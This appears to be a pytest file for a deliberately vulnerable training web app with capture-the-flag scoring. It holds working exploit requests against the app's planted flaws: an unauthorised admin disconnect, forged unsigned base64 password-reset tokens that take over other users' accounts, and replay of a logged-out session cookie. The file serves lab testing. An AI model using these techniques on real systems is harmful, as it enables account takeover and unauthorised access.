import base64

import requests


def test_privesc_teach(devon, base_url, extract_flag_fn, redeem_flag_fn):
    # meter id 2 doesn't belong to devon -- disconnecting it as a plain
    # customer (no role=admin check on this route) is the escalation.
    resp = devon.post(f"{base_url}/admin/meters/2/disconnect", timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(devon, base_url, flag)


def test_oldtoken_exercise(anon_session, base_url, extract_flag_fn, redeem_flag_fn):
    # ben's password isn't relied on as ben anywhere else in this suite --
    # deliberately chosen so this permanent password change is harmless.
    #
    # Phase 7: no flag on THIS response any more -- it's claimed on ben's
    # own dashboard, by the same wg_pid session, once it actually logs
    # in with the password it just set (see auth.py's
    # _forged_reset_pending and customer.py:dashboard()). anon_session,
    # not alice, so the same cookie jar carries through both requests.
    token = base64.urlsafe_b64encode(b"ben.wood@example.com:1000").decode()
    resp = anon_session.post(
        f"{base_url}/reset-password",
        data={"token": token, "password": "pwned-by-test-suite"},
        timeout=10,
    )
    assert resp.status_code == 200
    assert "FLAG{" not in resp.text

    # requests follows the login redirect straight to /dashboard by
    # default, so THIS response already carries the flag -- a separate
    # follow-up GET /dashboard would find it already claimed and gone
    # (dashboard() pops the pending entry once shown, see auth.py).
    login_resp = anon_session.post(
        f"{base_url}/login",
        data={"email": "ben.wood@example.com", "password": "pwned-by-test-suite"},
        timeout=10,
    )
    assert login_resp.status_code == 200
    flag = extract_flag_fn(login_resp.text)
    assert redeem_flag_fn(anon_session, base_url, flag)


def test_oldtoken_exercise_fresh_timestamp_also_counts(anon_session, base_url, extract_flag_fn, redeem_flag_fn):
    # Same forgery, but with a timestamp from right now instead of a
    # decades-old one -- there's no signature on this token at all, so a
    # fresh forgery for someone else's account is just as much a break
    # as a stale one; it just isn't ALSO the staleness-specific finding.
    import time

    fresh_token = base64.urlsafe_b64encode(f"harun.lee@example.com:{int(time.time())}".encode()).decode()
    resp = anon_session.post(
        f"{base_url}/reset-password",
        data={"token": fresh_token, "password": "pwned-by-test-suite-2"},
        timeout=10,
    )
    assert resp.status_code == 200

    login_resp = anon_session.post(
        f"{base_url}/login",
        data={"email": "harun.lee@example.com", "password": "pwned-by-test-suite-2"},
        timeout=10,
    )
    assert login_resp.status_code == 200
    flag = extract_flag_fn(login_resp.text)
    assert redeem_flag_fn(anon_session, base_url, flag)


def test_sessionreuse_bonus(login_fn, alice, base_url, redeem_flag_fn, participant_id):
    session, _ = login_fn("carla.clark@example.com", "carla123")
    token = session.cookies.get("wgs_session")
    assert token, "expected a wgs_session cookie after login"

    logout_resp = session.post(f"{base_url}/logout", timeout=10)
    assert logout_resp.status_code in (200, 302)

    # Replay the captured (now logged-out) token manually.
    replay = requests.Session()
    replay.verify = False
    replay.cookies.set("wgs_session", token)
    replay.cookies.set("wg_pid", participant_id)
    resp = replay.get(f"{base_url}/dashboard", timeout=10)
    flag = resp.cookies.get("flag_session_reuse")
    assert flag
    assert redeem_flag_fn(alice, base_url, flag)


def test_pwchange_teach(alice, base_url, extract_flag_fn, redeem_flag_fn):
    # Deliberately a strong password here, unlike test_05's
    # test_weakpw_change -- pwchange_flag is present on every
    # password-change response regardless of strength, but weakpw_flag is
    # ALSO present when the password is weak. Using a strong one here
    # keeps this response unambiguous (only pwchange_flag appears), so
    # extraction can't accidentally grab the other test's
    # already-claimed WEAKPW_CHANGE flag instead. Same reasoning for the
    # explicit Origin header -- see test_05's comment on the same pattern.
    resp = alice.post(
        f"{base_url}/account/password",
        data={"new_password": "Str0ngP@ssw0rd-2026!"},
        headers={"Origin": base_url},
        timeout=10,
    )
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_pwchange_teach_requires_length_over_seven(login_fn, base_url):
    """Phase 7: decoupled from WEAKPW_CHANGE -- an 8-plus character
    password change fires PWCHANGE_TEACH (tested above) whether or not
    it's otherwise weak; 7 or fewer characters fires WEAKPW_CHANGE
    (tested in test_05) but not this one, so a single short-password
    submission can no longer claim both flags at once."""
    import re
    import secrets

    import requests

    email = f"wgtest-{secrets.token_hex(4)}@example.com"
    requests.post(
        f"{base_url}/signup",
        data={"email": email, "password": "Str0ngPassw0rd", "name": "Hardening Test"},
        verify=False,
        timeout=10,
    )
    session, _ = login_fn(email, "Str0ngPassw0rd")

    resp = session.post(
        f"{base_url}/account/password",
        data={"new_password": "sh0rt12"},  # 7 characters exactly
        headers={"Origin": base_url},
        timeout=10,
    )
    assert resp.status_code == 200
    # PWCHANGE_TEACH is delivered as a bare HTML comment -- absent here,
    # even though WEAKPW_CHANGE's own flag is still present on the page.
    assert not re.search(r"<!--\s*FLAG\{", resp.text)
